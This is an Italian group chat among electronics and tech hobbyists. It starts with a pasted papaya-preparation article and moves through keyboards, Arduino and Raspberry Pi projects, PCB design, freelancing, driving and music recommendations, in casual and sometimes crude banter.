La vostra papaya è pulita e potrà essere tagliata a cubetti, spicchi o listarelle in base al vostro gusto o alla preparazione in cui dovrete destinarla.

Come si mangia la papaya
Generalmente la papaya viene acquistata per essere mangiata come un semplice frutto, privata quindi della sua buccia e gustata a fette.

Non tutti sanno però che della papaya sono ben tre le parti commestibili: foglie, semi ed ovviamente la polpa.

Le foglie della sua pianta sono molto utilizzate in Africa, America centrale ed Asia, dove vengono impiegate nelle ricette più tradizionali. Se volete portarle anche voi in cucina non vi resterà che sbollentarle per alcuni minuti, proprio come fareste per una comune verdura dalle foglie verdi.

I semi hanno un sapore amaro molto simile a quello del pepe nero e proprio per questo possono essere macinati, dopo averli puliti ed essiccati, ed impiegati su pietanze a base di pesce oppure di carne. E’ possibile inoltre consumarli come dei semplici integratori ma sarà sicuramente più difficile che riusciranno ad incontrare il vostro gusto.

La polpa resta senza ombra di dubbio la parte più apprezzata di questo frutto, impiegata per una ricca macedonia, per accompagnare piatti a base di carne, insalate o per fare degli ottimi e salutari centrifugati.

A proposito di centrifugati, uno dei migliori è decisamente quello in cui la papaya viene accostata al mango. Ecco in che modo preparare il centrifugato papaya e mango:

Iniziate a sbucciare entrambi i frutti, ben maturi, e frullateli assieme nella macchina specifica per centrifugati. Nel caso vogliate zuccherare il succo ottenuto aggiungete un po’ di miele e mescolate. A questo punto trasferite il tutto in un bicchiere capiente a mettete qualche fogliolina di menta, precedentemente pulita, per guarnire."
La quantità di semi di quella in alto a destra è proprio corretta 
Tolto niente 
Magari dipende dal periodo dell'anno
ha detto la mia sorellina chef di tagliarla a dadini e mangiarla con la forchetta, oppure centrifugarla a mo di frullato
Avevo ragione!
AHAHAHA
Cos hahahahhahaha
lo sai che sono un mostro 
Ma i semini si mangiano?
No
Ah beh allora meglio che ce me siano pochi
no sono amari
Eventualmente si, dicono che se li fai essiccare puoi macinarli sulla carne al posto del pepe
Ma vaffanculo 
la sorella chef di Korry consiglia di tagliarla a dadini e di mangiarla con la forchetta oppure con uno stuzzicadenti
Fai prima a compare il pepe
Abbiamo capito ahahahahahah
Eh ma vuoi mettere lo chic?
\warn non si insulta il boss supremo... Che poi ti trovi i droni fuori casa
tu e io Marco è un pò lento la sera
Puoi fare il Carlo Cracco della tua città 
Che sbatta
Alemeno lui lo è solo la sera
Ahahahahahah
di mio padre
Logitech g11
🤔mai sentita, ora la cerco
ook
ma i tasti macro (m1 m2 e m3) a cosa possono essere usati?
e i tasti g?
se riesci a trovare il software dovrebbero essere settabili per Word/Excel/Adobe
ok
minchia quanto è vecchia, è uscita con XP..avrà almeno 20-25 anni
in effetti mi ricordavo che avevo 4 anni e ci giocavo
ora ne ho 13 
però è carina
thx
qui c'è il software
è un ottima tastiera
ottimo
HAHAHAHAHAHA nel link c'è scritto "gaming"
a cosa si giocava, a Prato Fiorito?
bho
Ahahahahahahah
ma quindi per Linux nulla?
volevo mettere Ubuntu in dual boot
uno su tutti? Age of Empire  siete giovani, non potete conoscere il primo AOE
🤔non credo..prova ad aprire un thread in qualche forum Linux
ok
ma penso che almeno per scrivere possa essere usata
E invece Corrado sì che lo conosco... Quello e il primo starcraft sono gli unici giochi per computer a cui abbia mai giocato 

la cosa che mi piace di più è la rotellina per controllare il volume e i tasti per mandare avanti/dietro/stoppare/pausare una canzone
certo che si

Cicca intenditore
con questa si che ti divertiresti  una pacchia per Premiere
Devo fare il tutorial prima o poi su come creare tasti macro esterni con un arduino e un po' di pulsanti
se la vendono non dovrebbe costare molto
La pacchia di gamers e videomakers
🤔 potresti provare ad hackerare un tastierino numerico esterno
Eh si cazzo
fuori produzione..se si trova si trova usata
come non detto marco
Nah non serve, devo solo comprare dei red switch per fare le cose fatte bene
Per Premiere  

mi sono accorto che la tastiera ha anche il poggia polso
cosa molto buona
Bah inutile, non puoi cambiare i tasti perché c'è scritto sopra
ma dite che il raspi riesce ad alimentarla?
Io ho fatto la stessa cosa creando una combo di RGB personalizzata
Why not
bho
 akerino!1!1!
Minchia age of empire mi ricordo che quando ero piccolo giocavo sempre a quello con il pc di mio fratello
comunque dovrebbe uscire il 4 fra un po'
 i dash button non li hai più fatti?
eh si, lo stiamo aspettando in milioni..mi sto stancando di consumare Skyrim e Horizon
Shit
adesso mi è venuta la , se ritrovo il disco di aeo sta notte non dormo
Nel 2019 esce the elder scrolls vi probabilmente
speriamo 
chi è che registrerà domotica tutta la notte??? sei tuuu e si, e si, sei tuu
adesso ci sono anche quelli virtuali configurabili, li hai visti?
prego leggere con tono di mamma che vuole far divertire il figlio tipo bubù settete
Ma non usciva web domani? 
prego cambiare domotica con web developement 

  
 tastiera da orgasmo 
uffa, avevo promesso niente seghe
ma che differenza c'è tra i tasti macro segnati con e, quelli con g e quelli con m?
🤔 non ne ho idea
mhhh... 🤔
dovrò informarmi
quelli con m sono macro quelli con g sono gacro
Bah
Questa, altroché
sembra la plancia dell'Enterprice Romboli in plancia!
Ti metti a montare film? A me basta il g502 come tasti xD
Ma Shy che apre Patreon e in poche ore arriva a 10-15.000€ al mese?
È questo il bello di avere fan adulti
Se lo merita
Almeno, secondo me
E poi opinion rewards mi dà 49 centesimi per rispondere  "non ho ricevuto regali alla festa della mamma" 
Questi sono i soldi facili
Effettivamente ancora questo manca nella serie... ed è molto interessante
Il fatto dei tasti con arduino


Maledetto gruppo dell'Università su WhatsApp...
+1
A me sta antipatico... Ma in generale mi stanno antipatici praticamente tutti gli YouTuber
but why
aspetta... tutti tutti? 

Quasi tutti
E blink
?
Sisi lui

Ok
Cosa pensate che riesca a fare con un crossfire di rx 569
560
Lo stesso che fai con una sola 560, 1080p a medio/basso
Qualcuno è in possesso di questo?
Sensore laser x arduino e può mandarmi la foto del retro dello stampato, Grazie
Come mi consigliate di fare un programma grafico in python per rasp con schermo da 3,5"?
Volevo fare una cosa del.genere
Ma è normale che telegramx sia in inglese o lo è solo nel mio? XD
No idea, telegram melo tengo in inglese perchè la traduzione italiana mi fa alquanto schifo
cambia lingua 🤔
ma dell'X o in generale?
X
In generale, mi fa schifo vedere "in linea" "ultimo accesso: 42 minuti fa"
Meglio in inglese
Chi sa aiutarmi?
Oddio specifico per raspi non saprei
Prova a vedere ad esempio librerie come pyqt... Sono generiche, ma magari hanno qualche ottimizzazione per raspi
Ho visto sto fatto ma non riesco a capire come funziona
No idea
Benvenuto!
Grazie
ragazzi
mi serve un parere da voi
sto facendo il mio sito portfolio e l'ho fatto superminimale secondo il mio stile
voi lo capite?
Si, è molto bello
🤔
Anche se da mobile fa un po' di casini
E la homepage è abbastanza vuota
In alto a dx
molto bello, mi piace veramente, ma forse io metterei qualcosa in più nella home, ci ho messo tipo 20 secondi a trovare il tasto
e il testo un po' più grande, maybe
ah ah era quello il mio scopo :D
grazie per i complimenti, devo ancora sistemarlo
si si il testo più grande sicuramente voglio anche cambiare i colori
non saprei cosa mettere nella home
Molto ben fatto
sempre qualcosa di poco invasivo. pensavo di metterci una scritta al centro che mi presentava e poi che suggeriva di premere sul burger magari
Consiglio: Metti una tua citazione nella Homepage
mettendo un effetto lampeggio sul burger stesso
Ottima citazione
con un alone intorno magari, tipo neon
Ma lui non ha baffi
grazie per i consigli ❤️
sto pomeriggio mi adopero
Benvenuto 
Grazie
Sei forte
Purtroppo no, sembra molto artigianale comunque
Non credo, lo vendono tutti, banggood, amazon, ebay , aliexpess ecc
Dai colori della foto sembrano 2 res.  Da 10 k ma non mi quadrano.
Ho visto dal source che ancora non hai messo la stringa nell'head per farlo visualizzare bene da mobile, quindi ci sta che testi e icone siano minuscoli. A me piace, in attesa di riempire la home però ti posso consigliare di fare le striscie colorate del menù in orizzontale da mobile, perché verticali renderebbero difficile la lettiera del testo
Si sì all’installazione è sempre in inglese
ok, sto pomeriggio faccio le modifiche
Alla fine se ci pensi, striscie verticali stanno bene in uno schermo da PC, quindi 16/9, mentre lo schermo di un telefono è 9/16, quindi ci stanno meglio strisce orizzontali
solo che non so come riempire la home perché vorei che fosse più pulita possibile
Se hai un tuo logo, lo fai minimale e metti quello
vediamo che ne esce
Risolto, grazie. Su banggood !!!
Qt
Avete scelto che impiego avrà il robot?
yup
Esce simile? Se non sbaglio questo non è eseguito nel desktop ma tipo dal terminale
Traccerà una ciabatta
cioè, è un test ma per adesso fa così: in pratica lo avvii, gli dici cosa tracciare e lui si mette a inseguirlo
... 
aka ti cammina dietro
Usate open-cv per il riconoscimento?
esatto
sempre se riesco a installarlo, non so perchè ma si blocca il raspi
Hai fatto una repo su GitHub?
Privata
nope, quella del bot è pubblica
uno guarda il mio profilo e vede solo una repo, quindi pensa che sia un developer poco attivo... poi in realtà ho 9 repo private .-.
Potrei entrare nel gruppo?
se vuoi... non c'è nulla da fare però 
Wow che cosa fa xD
^
Devo creare una wiki, ora che ci penso
Se non lo fai con un orange pi non sei nessuno però
Tutti lo fanno con i rasp
Va bene. Il link me lo scrivi qui o in privata?
eeh non ce l'ho 
é privato, devo aggiungerti
n'attimo che mangio e ti addo
🤔
Che c'è? XD
non potevo trovarti altrove.......
Poco ma sicuro! :D
 
 al posto di saldare posso usare della colla a caldo sotto il sonoff?
La colla non è equivalente alla saldatura...anzi rischi falsi contatti
Ok
Ma intendevo mettere due cavetti(quelli piccoli dei kit di Arduino) e sotto incollarli con la colla a caldo
Lo stagno si trova al supermercato,
?
Dipende in quale vai
Basta andare al brico e lo trovi
Esselunga
Conad
Iper
Vai al brico
È a 11Km
-___-
Qualsiasi ferramenta lo trovi
Non cambia
In un negozio di meccanica?
Se sei fortunato, si
Heyla
Kingston SSD A400 - 120GB Drive a Stato Solido (2.5", SATA III TLC) 
Ve lo giro in caso a qualcuno possa interessare
(spero potessi girare il link  non ha reffeal, è preso dall'app di amazon)
Altrimenti provvedo ad eliminare tutto
nono, va bene
Grazie 
(mi serviva proprio un SSD )
Secondo voi riesco a saldare i cavi dell'alimentatore direttamente alla mobo del PC portatile? Vorrei trasformarlo in un Fisso e utilizzarlo (se non sbaglio 
 aveva fatto qualcosa a riguardo)
Già già...lo puoi fare
perchè ti vuoi del male?
Perchè si è fuso lo spinotto
È un po' scomodo da usare.poi
Ed è un buon Computer tra l'altro
Allora apposto
Se sei sicuro di aprirlo... dissaldare il jack e saldare i cavi  allora apposto...
In pratica è quella serie di PC Asus con l'alimentazione difettosa
Dovrei anche rimpiazzarli i cavi
Mmmm gli alimentatori sono difficili da aprire ...e soprattutto da chiudere senza spaccare la plastica
Metti un bel connettore tra mezzo... almeno puoi staccare quando vuoi
Mmh... Ok


visto 
Ragazzi qualche idea per creare un tipo di app utile?
Non importa quanti siano, ne merita di più
Sinceramente l'unico youtuber che ho visto parlare dei propri guadagni è stato quello svizzero di c-jon
E io stesso preferirei non farlo
Chi?
Cosa fa?
Ah, bello
Anche overVolt
Ma anche moltissimi big guadagnatori
wooooww
37 mila dollari al mese
Kurzgesagt 
Vi stupite se vi dico che mi sta antipatico? 
Dipende...tu ti stupisci se ti dico che oggi ho preso 2?
Sì ahahah
Allora si
Guinrata di merda
Senza che ho fatto niente poi
Ah
A caso
Ho trovato un software per programmare naza per spostare il drone senza telecomando. Cioe da milano a bergamo da solo. Imposti il tracciato e via. Il problema è la batteria
Ma come fai
Con un programma. Pero se devi cambiare destinazione devi sempre programmarlo che palle
Scusa mi sono imbrogliato
Eh
Si, assolutamente
Hai proprio un problema con gli youtubers
Davide Fiorentin:
Domanda... I fori dei componenti su easyeda sono connessi sia sul toplayer sia sul bottomlayer? Cioè... Se metto che si connette al bottomlayer un filo... Quel filo me lo ritrovo con lo stesso contatto anche sopra no?
Kurz sono una decina di persone: un'azienda che lavora, fa cose e pubblica dei prodotti super professionali fatti benissimo sotto ogni aspetto. Non c'è nessuna componente personale in quel canale quindi non ti può stare 
 perché non ha nessun senso
Ho visto qualche video di kurzgesagt e i tipi mi sono risultati antipatici
Ha senso sì
Tipi chi? Le papere fatte in illustrator? 
Mmmh dipende se sono passanti o no
Se usi componenti SMD non hai fori da parte a parte
Le voci
Il modo di parlare
Chettedevodi', l'unico youtuber che seguo sei tu marco
^

Sisi ma lo confesso
Ok quello lo sapevo comunque se sono passanti sono collegati no? Tipo se volessi saldare una resistenza con stagno sul bottomlayer ma il collegamento è sul quello sopra... Si connette giusto?
Ah e poi ho usato una via per poter passare una pista da 200mil su un triac in modo da spartire 100 sopra e 100 sotto... Ma il diametro interno è quello che fa da conduttore? O tutta la parte da diametro interno a esterno?
Questo
 hai idea di cosa sia e quanto valga?
Solo il forellino è passante.
Poi quando incontra lo stagno si riepie
Okk grazie allora lo allargo un po' cosí ho piú superifice
Sapete se ci sono problemi con l' HOST  di switchando? Mi da problemi di connessione
Che resista a 1kw?
Non lo conosco quel software, ma puoi disegnarlo piu grosso oppure utilizzare quello per i componenti
Qualcuno ha provato a collegarsi con l' HOST di switchando?
qualcuno ha un case della corsair 275R?
Qualche risposta? Grazie
Aiuto... switchando 
?
Chiedi al dev, 
Mi appare errore 522: originale connection time-out
eh non va proprio il dominio
appena viene online si accorge, tranqui
Quindi problemi tecnici da parte loro?
Lo stavo per caricarlo sul Raspberry
sisi, non so cosa ci sia che non va ma 
 non risponde
sì
la macchina è in manutenzione da stamattina
un po' di pazienza e tornerà online
Chi ha un mailserver in una vps di scaleway?
Alias c'è l'aggiornamento obbligatorio di w10 e torneremo online tra qualche lustro
 
no
è Ubuntu 16.04
ed è tornato online ora
Per fortuna
che scheda madre mi consigliate sotto i 150€ per ryzen 1700x?(con un po' di led sopra non farebbe male)
Perfetto, adesso switchando è tornato online

figo
adesso lo vedo :)
comunque la butto lì ragazzi
diciamo che io voglia diventare un freelancer, sviluppare siti ( prettamente frontend ) e fare qualche grafica, è possibile farlo o è pazzia?
non dico di fare uno stipendio pieno ma attualmente anche fare quei 300-400 euro al mese sarebbe ottimo
Prendi 1700, che il 1700x è solo leggermente overcloccato di fabbrica
E che budget hai per la scheda madre?
(also, se compri la roba con il ref ti voglio bene )
150€
ok grazie
150€
150€ è un budget importante, non arrivi alla taichi ma ti ci sta un'eccellente Asrock Killer SLI 

E' possibile ma devi avere i controcoglioni
Io faccio lavoretti per ragazzi, mi tiro su 50+€ al mese che non vanno mai buttati via 
È dura, secondo me
Difficile ma se diventi bravo fidati che i soldi li fai
Ovviamente sarebbe meglio full stack
Beh certo
Difficile fare lavori grossi che comprendono necessariamente un ottimo uso di JS e CSS
Ma i soldi li fai anche se lavori in azienda alla fine. Ho amici che appena diplomati hanno iniziato a lavorare e per essere al primo lavoro si portano a casa uno stipendio di tutto rispetto.
E considera che più avanti si va, più dovrebbe salire un po'
circa quanto? perchè io uscito da scuola molto probabilmente avrò un lavoro
Certo é che sapendo solo CSS e JS anche lì si fa poco
E' quello il frontend
≈ 1200
ok
uscirò da un istituto tecnico e l'ultimo anno passano i datori di lavoro a fare i colloqui
Si, ma si fa poco lo stesso, sarebbe bene sapere anche react o altre tecnologie simili, oppure avere conoscenze di ux/ui design
Poi ovvio che non si può sapere tutto, spesso sono le aziende a fare i corsi di formazione
react non è un framework di js?
Si, ma bello tosto
Ecco, sai js e css hai la chiave per le porte successive
Io lo sto imparando ed é completamente diverso da js
uau
Ho un telefono in cui ti spunta pubblicità da ogni parte, come faccio per toglierla??

Non e un spam,non capitemi male 
Ma... da quando è conosciuto anche qui questo canale? 
wut .-.
Sono 3KG
dettagli
solo?
io ho un cestino(UN CESTINO) pieno di cioccolato
saranno 5-6kg
Si?
Mmm
Ora lo peso per bene
okok
Io ho ancora 3 uova in soggiorno da aprire
Io ho già finito tutto
Del resto quest'anno siamo andati un po' a risparmio tra i parenti... Not good
Un uovo kinder e un coniglio Kinder
Reset
Oppure trovi l'adware che hai installato
Noi 2.5 kg a pasqua
l'ho già resettato, ma la pubblicità c'è da quando l'ho comprato.... ogni tanto me la apre da shell o da altri processi di android
Mai detto di fare tanti soldi
Dico solo di fare un piccolo stipendio mensile ( ho già un'altra entrata fissa )
Però deve essere da Freelancer cioè io devo scegliere quando lavorare e deve occupare poco tempo
Solo che ho visto che la gente si lamenta molto di piattaforme da Freelancer come upwork twago etc
Se uno chiede il rimborso su amazon,gearbest ecc... e aveva usato un referral link, i soldi vengono presi in dietro al proprietario del referral?
È una domanda stupida ma sono curioso
Uh questa è una buona domanda per 

Oggi ho trovato uno che guidava così
Col cellulare in mano ovviamente
Da me uno mi ha suonato perchè mi sono fermato a fare benzina
Poi alla fine siamo sempre noi con i motorini ad andarci di mezzo
Beh finché non state in mezzo al cazzo per me non esistete
Appunto perché non stai attento anche a noi? La maggior parte Delle volte son gli automobilisti a venirci addosso/non dare precendenza/ non usare le freccie
Nel senso che non mi date fastidio
Era in generale
Mica sono scemo e vado addosso alla gente
Che per giunta non sapendo fare la costatazione amichevole faccio ancora più premura
C'è da dire che di mongoloidi ce ne sono eh
Tipo quello di prima
Dopo il corto circuito dell'ultima volta ho deciso di metterlo "in "sicurezza""
Carta di giornale e colla vinilica, funzionano sempre
Ahahah bella questa
... non sai come guidano qua
So come guida la gente con il motorino però...facendo slalom fra le auto, sorpassando da tutti i lati, non dando precedenze...i motociclisti sono pericolosi quanto i ciclisti sulle strade
No no no sono pericolosi gli automobilisti
non ha senso questo discorso, è come dire che se io faccio una cosa allora la fa tutto il mondo
Devo dire che lo slalom quando c'è traffico lo faccio anche io ... Però le precedenze le rispetto. E metto le freccie
Sono sulla strada almeno 6 ore al giorno, per 5 giorni a settimana
Posso permettermi di generalizzare
no
Assolutamente no
Visto che per 1 che guida bene, 10 guidano male
vai in giro per tutta italia?
Vieni qua al sud Italia vieni
È capitato
ma non lo fai sempre, e in ogni caso generalizzare non ha senso
Ci vado un estate si è una no, sono tutti animali sulla strada, motociclisti compresi
Ha decisamente senso se è un comportamento diffuso...
comunque non vedo il senso di discutere su degli automobilisti 🤷‍♂
ma non vuol dire che lo fanno tutti
È conversazione, come si stava facendo prima, generalizzando sugli automobilisti
Facciamo una cosa dividiamo l'Italia in due
Nord e sud Italia
Nel sud Italia tutti guidano male
E' già divisa in due
È li siamo d'accordo
Nell'immaginario collettivo
Perfetto io tra tutti qua son quelli che guida meglio
Ci stanno dei miei soci che non hanno le freccie
A ragione, aggiungerei
Fin qua siamo tutti d'accordo
Che tu sia un caso eccezionale lo ammettiamo? Tra quelli che girano a 2 ruote
Diciamo che son quell'uno su dieci
Anche se le cazzate ogni tanto le faccio anche io
Da non guidatore posso permettermi di dire che c'è chi guida bene e chi guida male? Da nord a sud e con auto, bici e moto.
Io vivo in Molise
E ti posso assicurare che tutti guidando male
Certamente, ma ci sono comportamenti che, fidati, stando tante ore sulla strada, vedi e rivedi sempre dalle stesse categorie
Ad esempio il 99% dei cicli andrà a zig zag, affiacandosi ad altri ciclisti
I soldi del ref vengono tolti
Sennò fai un bot che compra Fiat su Amazon e poi annulla l'ordine 10 minuti dopo
Fiat
Tra tutte le macchine, perché Fiat?
Perché sono le uniche che vendono su Amazon

Niente Chevrolet?
Raga ho un problema con Junit e il test per un programma in Java
So che vi fa cacare però sapreste darmi una mano?🤔
Boh, dico Amazon Italia io
è finita la cresima, uno è svenuto :I
Ah
Uno stress per ride
che
Rip
ragazzi una domanda ma con google assistant si può spegnere il pc?
mi spiego meglio posso spegnere il pc dal telefono con google assistant senza "prese intelligenti"?
Google assistano aiy e in italiano?
Cos'è?
Ragazzi scusate ma qui posso chiedere se qualcuno è disponibile per una commissione?
Devi assumere un sicario?
in pratica mi hanno chiesto se ci fosse qualcuno disposto a fare un portale e forum Minecraft per un server, ovviamente retribuito, e io chiedo in questo gruppo
Ah dispiace ma non sono io
un fregno che avevo rotto tempo fa
A che serviva?
era il controller domotico principale della mia stanza
ora sono riuscito a sostituire i componenti che erano saltati
però c'è un altro problema
Figo
when your codice funziona.
Allora non sono l'unico che il sabato sera sta al PC
no, se il mio Arduino da di matto proprio il sabato sera non sei l'unico
è la seconda volta che impazzisce e poi elimina da solo il codice caricato sopra
Ah ecco
Come le spediscono?
Uo debuggavo una roba che con JUnit mi faceva smattare
Ditemi che non sono l'unico a sentire sta roba mentre programmo
Bella domanda 🤔
Secondo me la spediscono al più vicino concessionario
Dove poi finisci di fare le carte, perché una macchina non la compri come una chiavetta USB 
secondo me fanno come fanno coi noleggi
te la consegnano a casa
vengono con due macchine e tornano con una
non sei l'unico, io mentre programmo sento la dpg
Io sento roba di qualità, tipo 


anche io
tipo ora sto sentendo Ghostblaster di Gabry Ponte
Troppo Garrix però
Io guardo Coliandro quando programmo
Eh al creatore piace 🤷‍♂️
Esistono modi per Forkare una Playlist su Spotify come su Github?
lol raga, ero carico elettrostaticamente, ho toccato un Arduino e si è acceso per un attimo 
Ci butto dentro Mesto, Mike Williams e Jay Eskar
Lel
HAHAHHAHA
Idolo
Me ne sono accorto
Io tutt'oggi stavo giocando...ho dimenticato del c++
Omg ti invidio,hai robottizato la casa
Nashley>>>
O roba buona (secondo me) tipo Tchami, EDX, Lucas & Steve, *qualsiasi canzone nel canale di Future House Music*, qualcosa di bass house o roba più tranquilla come Nora En Pure
Qualsiasi canzone nel canale FHM mi ha ucciso 
"usare i guanti quando si maneggiano schede elettroniche"
ahahahah, mi hai trovato 
Ho dimenticato Brooks
Quello c'è d'obbligo
l'unica differenza che al posto di bestemmiare su C# bestemmio su Java
(che poi sono pure simili quindi...)
C'è da dire che era incluso in FHM, allora rilancio con Eric Prydz
E Mesto?
Ottimo Mesto
Considerato anche il fatto che ha un anno in meno di me
*prende appunti*
Lo conoscevo, lo conoscevo, sono molto Spinnin' oriented

NO BELLISSIMO AHAHAHAHAHAHAHAHAHAHAH
Ma il bello è che sta roba è su spotify 
No ti procurano un contratto. Mi sono informato
dite le 500 e panda vendute su amazon?
chiunque può mettere musica su Spotify
adesso puoi portarlo all'isola ecologica e augurargli un buon riciclo
Che senso ha comprarle la, con quello che costano
Meglio rubarle, dici?
? lol
Si, è vero. Non è difficile mettere musica su Spotify
Basta avere un account Artist
  
Direttamente ai concessionari, molte km0 poi hanno prezzi mooolto minori... Tanto vale cercarla con autoscout24
Posso confermare che in Molise guidano da paura ... i sorpassi poi...
ma ❤️
ehm... 
in realtà era nata come una playlist che doveva avere solo canzoni di Garrix, per quello all'inizio è piena
perchè non posso aggiungere solo un utente come collaboratore? 
a.k.a. Brooks >
ecccolo
Ho recuperato 24 video di Casey in 3 giorni (perché devo guardarli tutti e in ordine) 
Sì, ero un po' indietro  Mancano 5 e sono in pari
maronn
io gli unici di cui non mi perdo nessun video sono overVolt e 50ShadesOfPing, poi per il resto vado sulla home di YouTube e guardo un po' che ci sta...
A cosa servono i caratteri "?" e ":"  nei calcoli di Arduino....????
Che operazione compianto?
Sono un if
Hai tipo variabile = condizione ? Valore1 : valore2

E variabile assume valore1 se condizione è vera, altrimenti assume valore2
che scienzato!!!!!!!!
Aaaa giaaaaaa... è l'if ristretto... Lo ha detto il capo in un suo video anche
Eh? 
phper
non voglio fare propaganta domotistica ma home assistant e switchando sono i migliori assistenti!! Forse switchando è un po' acerbo. Attendo miglioramenti nella grafica.
una saldatrice ad elettrodo Deca..sono ottime se ha tutti gli attrezzi ed è in buone condizioni circa 100€
 offline
Noo, e come faccio le invalsi adesso 

Visto i miei progressi?!
Stavi pensando di comprare il vinile
ottima scelta
Modestamente
A me va
 conosci Myles Kennedy? è universlamente riconosciuto come la più bella voce rock dopo la morte di Freddie Mercury
Ora sento
A me va se lo cerco su Google
Se scrivo sulla barra degli url "
" mi reindirizza su una path inesistente
Non mi piace
Un passo alla volta, non partire in quarta adesso ahahahah
Ti stai convertendo?
Si
A un genere di musica diverso
Ti piace il progressive rock? Perché avrei cose da consigliarti
questa è una delle mie preferite..è un mostro Garrett, il miglior violinista al mondo 

Yo
Io sono uno che a casa sente praticamente solo musica rap ed elettronica, ma in giro sento quasi solo rock e tutti i sottogeneri.
Provo tutto, poi giudico
questi sono mostruosi  li ho sentiti 2 volte dal vivo, a Praga e a Verona 

Mi sei caduto sul rap
Più che fai trap
 dici che poi si converte di nuovo se gli passo tu sai cosa?
Gimbal professionale a me o di 200 euro!
prova..se non mi muore ascoltano Dusan alla batteria può sopportare tutto
Esiste un limite a tutto 
In realtà è roba abbastanza leggera, è che pochi possono capirla
fidati, ascolta sia Garrett sia i 2Cellos..sono mostruosi
Comunque bug dello screen a parte, toh
 i mitici
Non c'è niente di più bello di sentirselo nei viaggi in macchina
Mi avete seriamente passato i Pink Floyd?
e io ti passo questa invece: 
Con questa vaisuk sicuro
Sera ragazzi
Cosa ne pensate in merito alle liste di Girada?
ti dico che sono fenomenali..io per andare a 2 concerti di un gruppo devono essere davvero bravi
Sto bot è vita raga HAHAHHA
In realtà gli ho detto io di inviarti quel messaggio, ma shhh
Comunque ninjato, già visto
Che devono  bruciare
Proverò!
Perché? Una lista non è positiva come cosa?
Cosa ne penso? Guarda, dimmi tu cosa pensi di un sito dove paghi 1/4 del prodotto perché i restanti 3/4 lo pagano i 3 amici che inviti (che a sua volta devono invitare altre 3 persone per fare la stessa cosa col loro prodotto).
Assolutamente no
questa invece è in assoluto la mia canzone preferita..il migliore assolo in assoluto 

E qui ci siamo
Però le liste, non velocizzano tutto ciò?
toooop 
Peggio ancora
Sono troppo lenti
E poi c'è gente che dice che la miglior canzone dei Pink Floyd è Another Brick In The Wall... (E soprattutto c'è gente che conosce solo quella)
basta chiedere  

E poi c'è genere (come me) che non comsiec nessuna Delle due
Ahahahahah ora sento
Vuoi sentire quello che ascolto adesso?
a me non piace per niente, mentre la mia fidanzata (fan sfegatata dei Pink) la adora..per me in assoluto le migliori 3 sono: Comfortably Numb, Money e Shine on you crazy diamond
Questa ha un significato SPETTACOLARE
Devi capire che ci sarà un momento in cui la lista arriverà a dimensioni tali che nessuno potrà più sostenerla, e il sito fallisce.
ma i Pink sono leggendari! è come non conoscere i Beatles e Michael Jackson! oppure come non conoscere i DEI DELLA MUSICA, i Queen!
E Girada non se la sta passando tantp bene.
i Chainsmoker!!!!ma così mi inviti a nozze
Ehm
Io conosco gente che non li conosce
Tanta gente
Più che altro sono quelle canzoni che ho ascoltato ma non mi sono mai messo a dire: "cacchio bella, adesso la metto nella playlist"
Grande 
tanta brutta gente 
Il mio compagno di banco conosce solo musica reggaeton, Eminem e Skrillex di nome.
ma perche corrado ha gusti musicali cosi stupendi?
Ma porca...
ragazzi, se volete farvi una cultura di rock, punk e metal, dallo zio Korry dovete venire
Ho mandato troppe canzoni
Grandi loro
Unici
perchè suono e ho una fidanzata musicista e malata di musica
Un secondo che mando due canzoni alla volta
Shhh che non sai cosa sto sentendo io
Così il bot non mi blocca per flood
cioè, se nomini Scorpions, Toto e Clash a dei ragazzini, ti guardano male 
E se la lista fosse nuova?
quei ragazzini
meritano gli schiaffi
Ma le canzoni che ho mandato?
eh vabbè, qua vai sul pesante..questa è per specialisti 
A me guardando male perché fa abbastanza schifo Fabri Fibra, l'altro giorno stavo sentendo Lithium dei Nirvana e uno mi fa "ma chi sto sti qua, togli sta merda"
 
  inizia a salutare plaza
 che generazione perduta
Semplicemente abituata ad altro
dopo sento
E poi mette Vip in trip di Fabri Fibra che Madonna appena si è allontanato l'ho cancellata dalla cronologia di Spotify
 vabbè questo è fenomenale magari non vi piace
Ma provate
Guardate prima
Capirete il perché
bestemmie
 ❤️questi sono dei miti assoluti
 prima di giudicare...guarda
aggiungo alla playlist da sentireee
ascoltato in diretta, è davvero bravo
Comunque quest'anno
Abbiamo bei talenti
Meritano veramente
 
 
E lui se ne esce così
Ma porca miseria, sono in fissa con queste canzoni
Comunque scherzi a parte anche Leave a Light On è bellissima ma è destinata a sparire
E questo non è Skrillex 
Tutte ormai sono destinate a spararire
Tranne Stromae
Lui rimane
Obbligatoriamente
Non avete scelta
Macché Stromae
Francesi di merd*
Non ti piace Stromae?!
Piaceva

Ma è Stromae!
Eh oh poi mi è partito il razzismo verso i francesi
Ma lui è formidabile
E csgo è una delle cause.
Fooormidable
Tu etè fooormidable
Ahahahahahah
Come mai?
Perché si credono i king del mondo
devi giocarci con questa in sottofondo 

Si, ma Stromae è caso a sè
🤔 volete dei mostri sacri? 
  

Dipende
Y
Direttamente dalla mia selezione personale
Anni 60..roba da intenditori
Direttamente? Perché c'è anche la versione col proxy?
ci sono le versioni per intenditori e quella per il pubblico
Troppo anni 60
Immagina che durante il video mi stavo per mettere i pantaloni a zampa d'elefante perché mi sentivo a disagio
Leggendo Deep mi hai fatto venire in mente uno
  ora ti riprenderai allora
Uuuhhh
Ma non esistono mezze misure? 
 
cover migliorata di Eric Clapton
questa la conosco, è veramente bravo
*era
È andato
Diciamo che lo aveva già programmato
questo mi dispiace
 se ti dico Black Stone Cherry? li conosci?
No, mi sembra la cosa più stupida da fare
eh lo so
Mi era capitato in una playlist
In realtà lo conoscevano in pochissimi
Ma non li ho mai approfonditi
Consocono tutti lil pump
Ma nessuno lil peep
Arriveranno
Ahhhh sii
avete visto "Ritorno al futuro" immagino
giusto?
Ni
Si, tutti
allora questa devi inserirla in playlist, è un classico 

E non l'hai mandato a cagare?
Uuuhhh siii
Korry
La conosco la conosco
Boia
Eh
Quando la passione supera tutto
Lo posso capire ma mi rendo conto che ci sono delle eccezioni. Tipo Tchami, per quanto riguarda quello che ascolto io
No aspetta, stai calmo, in Francia Regan Stromae.... STOP
dove l'hai trovata?
  questa la conosci? 
Da un mio parente orami partito
Quanto può valere?
Cos
non ne ho idea 🤔
YEP
Ma lui funzionare?
È la verità
bravo ragazzo..intenditoreeeeeeeee
booooooooooooooo
È ancora incelofanata e nella sua custodia originale
Con tanto di spugnetta sotto la scheda madre
 
 questa ovviamente la conoscerete 
Eh beh
se dovessi postare tutte le canzoni che ho selezionato non basterebbe un giorno
Fai un canaleeee
musica da intenditori..i Creedence li conoscono in pochi per esempio..idem i Who
 quasi quasi domani lo faccio
